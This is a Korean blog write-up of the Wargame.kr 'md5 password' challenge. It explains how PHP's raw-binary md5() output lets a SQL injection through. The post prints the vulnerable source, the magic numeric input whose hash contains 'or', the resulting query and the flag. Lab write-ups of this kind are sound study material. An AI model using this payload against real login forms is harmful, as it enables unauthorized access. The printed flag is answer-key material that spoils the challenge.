---
title: "[Wargame.kr] md5 password 문제풀이"
date: 2018-10-26
draft: false
category: [wargame]
subcategories: [wargame.kr]
tags: [Write-up, Wargame.kr]
---

일하기가 싫으니까 1일 1문제가 너무 잘된다 ㅎㅎㅎ  

계속 문제 이렇게 꾸준히 풀면 언젠간 CTF에서도 좋은 성적을 얻을 수 있겠지...?? ㅎㅎ  

이번 문제는 `MD5 SQL Injection`이다.  

<!--more-->

문제 정보는 다음과 같다.  

```plain
md5('value', true);
```

문제 페이지에 접속하면 `password`를 입력하는 칸이 하나 있고, 페이지의 소스코드를 확인할 수 있다.  

```php
<?php
 if (isset($_GET['view-source'])) {
  show_source(__FILE__);
  exit();
 }

 if(isset($_POST['ps'])){
  sleep(1);
  mysql_connect("localhost","md5_password","md5_password_pz");
  mysql_select_db("md5_password");
  mysql_query("set names utf8");
  /*
  
  create table admin_password(
   password char(64) unique
  );
  
  */

  include "../lib.php"; // include for auth_code function.
  $key=auth_code("md5 password");
  $ps = mysql_real_escape_string($_POST['ps']);
  $row=@mysql_fetch_array(mysql_query("select * from admin_password where password='".md5($ps,true)."'"));
  if(isset($row[0])){
   echo "hello admin!"."<br />";
   echo "Password : ".$key;
  }else{
   echo "wrong..";
  }
 }
?>
<style>
 input[type=text] {width:200px;}
</style>
<br />
<br />
<form method="post" action="./index.php">
password : <input type="text" name="ps" /><input type="submit" value="login" />
</form>
<div><a href='?view-source'>get source</a></div>
```

소스코드를 살펴보면, 내가 입력 한 password의 값이 md5 함수를 통과 해 쿼리문의 password 자리에 들어간다.
근데 이 때, `md5($ps, true)`를 사용한다.
php에서 `md5()` 함수를 사용할 때, 두 번째 인자는 `true` 혹은 `false`의 값을 받는다.
만약에 true라면, 결과가 binary 형태로 나오고, false라면 hex 값의 형태로 나온다.
물론 defalut 값은 false이다.  

두 번째 인자가 ture일 경우 만약에 내가 입력 한 password가 md5 함수를 통과하여 binary 형태로 나왔을 때, ASCII 범위 안에 있는 문자라면 그대로 출력된다.  
때문에 만약 md5 함수를 통과 한 결과가 `' or '` 형태를 띈다면 완성되는 쿼리는 다음과 같기 때문에 SQL Injection이 가능해 진다.  

```plain
select * from admin_password where password='' or ''
```

이런 형태가 나오는 값을 직접 구해봐도 되지만, 아마도 인터넷에 잘 알려져 있을 것 같았다.
그래서 구글신에게 `md5 sql injection`이라고 검색을 해 봤더니 아래와 같은 값을 입력하면 `' or '` 형태의 결과값을 얻을 수 있다고 한다.  

```plain
129581926211651571912466741651878684928
```

이를 직접 `python`으로 테스트 해 보았다.  

```bash
$ python
Python 2.7.12 (default, Dec  4 2017, 14:50:18) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import hashlib
>>> print hashlib.md5("129581926211651571912466741651878684928").digest()
ٔ0Do#ࠁ'or'8
```

그 결과 완성되는 쿼리는 다음과 같다.  

```plain
select * from admin_password where password='ٔ0Do#ࠁ'or'8'
```

때문에 `password='ٔ0Do#ࠁ'` 부분은 `false`가 되고 `'8'` 부분이 `true`가 되어 값을 추출할 수 있다.
다시 문제 페이지로 돌아가 `129581926211651571912466741651878684928` 입력했더니 아래와 같이 flag를 얻을 수 있었다.  

![](/images/wargame.kr/md5_password/md5_01.png)

```plain
FLAG : 3f73ad2d57d66488b92c10f0bce1cfcb35e99882 
```
